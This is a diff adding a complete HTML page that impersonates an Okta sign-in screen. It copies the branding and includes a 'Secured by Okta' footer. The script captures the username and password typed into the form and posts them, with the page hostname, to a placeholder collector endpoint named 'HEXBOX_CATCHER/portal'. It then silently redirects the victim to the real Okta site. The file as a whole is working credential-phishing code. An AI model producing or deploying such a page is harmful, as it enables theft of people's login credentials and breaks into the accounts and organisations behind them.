@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sign In</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif;background:#f4f4f4;min-height:100vh;display:flex;flex-direction:column}
+.okta-header{background:#007dc1;padding:0 24px;height:60px;display:flex;align-items:center}
+.okta-logo{color:#fff;font-size:20px;font-weight:700;letter-spacing:1px}
+.container{flex:1;display:flex;align-items:center;justify-content:center;padding:30px 20px}
+.card{background:#fff;width:100%;max-width:400px;border-radius:3px;box-shadow:0 1px 4px rgba(0,0,0,.2);overflow:hidden}
+.card-header{background:#007dc1;padding:20px 30px}
+.card-header h1{color:#fff;font-size:18px;font-weight:600}
+.card-body{padding:30px}
+.field-wrap{margin-bottom:20px}
+.field-wrap label{display:block;font-size:13px;font-weight:600;color:#333;margin-bottom:6px;text-transform:uppercase;letter-spacing:.5px}
+.field-wrap input{width:100%;padding:10px 12px;font-size:14px;border:1px solid #c8c8c8;border-radius:3px;outline:none;transition:border .15s,box-shadow .15s}
+.field-wrap input:focus{border-color:#007dc1;box-shadow:0 0 0 2px rgba(0,125,193,.15)}
+.error-msg{display:none;color:#d93025;font-size:12px;margin-top:4px}
+.error-msg.show{display:block}
+.btn-signin{width:100%;padding:11px;background:#007dc1;color:#fff;font-size:14px;font-weight:600;border:none;border-radius:3px;cursor:pointer;margin-top:4px;transition:background .15s}
+.btn-signin:hover{background:#006aad}
+.links-row{margin-top:18px;display:flex;justify-content:space-between}
+.links-row a{font-size:13px;color:#007dc1;text-decoration:none}
+.links-row a:hover{text-decoration:underline}
+.card-footer{background:#f9f9f9;border-top:1px solid #e8e8e8;padding:14px 30px;font-size:12px;color:#777;text-align:center}
+</style>
+</head>
+<body>
+
+<div class="okta-header">
+  <span class="okta-logo">okta</span>
+</div>
+
+<div class="container">
+  <div class="card">
+    <div class="card-header">
+      <h1>Sign In</h1>
+    </div>
+    <div class="card-body">
+      <form id="loginForm" action="HEXBOX_CATCHER/portal" method="POST" novalidate>
+        <input type="hidden" name="portal" value="okta">
+
+        <div class="field-wrap">
+          <label for="email">Username</label>
+          <input type="text" id="email" name="username" autocomplete="username"
+                 autocorrect="off" autocapitalize="off" spellcheck="false"
+                 placeholder="Enter your username" required>
+          <div class="error-msg" id="emailErr">Please enter a username.</div>
+        </div>
+
+        <div class="field-wrap">
+          <label for="password">Password</label>
+          <input type="password" id="password" name="password"
+                 autocomplete="current-password" placeholder="Enter your password" required>
+          <div class="error-msg" id="passErr">Please enter a password.</div>
+        </div>
+
+        <button type="submit" class="btn-signin">Sign In</button>
+
+        <div class="links-row">
+          <a href="#">Forgot password?</a>
+          <a href="#">Help</a>
+        </div>
+      </form>
+    </div>
+    <div class="card-footer">
+      Secured by <strong>Okta</strong>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+  var form = document.getElementById('loginForm');
+  var emailErr = document.getElementById('emailErr');
+  var passErr = document.getElementById('passErr');
+
+  form.addEventListener('submit', function(e){
+    e.preventDefault();
+    var username = document.getElementById('email').value.trim();
+    var password = document.getElementById('password').value;
+    var valid = true;
+
+    if(!username){ emailErr.classList.add('show'); valid=false; }
+    else { emailErr.classList.remove('show'); }
+    if(!password){ passErr.classList.add('show'); valid=false; }
+    else { passErr.classList.remove('show'); }
+    if(!valid) return;
+
+    var payload = {
+      username: username,
+      password: password,
+      portal: 'okta',
+      host: window.location.hostname
+    };
+
+    fetch('HEXBOX_CATCHER/portal', {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify(payload),
+      credentials: 'omit'
+    }).catch(function(){})
+      .finally(function(){
+        window.location.href = 'https://www.okta.com';
+      });
+  });
+})();
+</script>
+</body>
+</html>
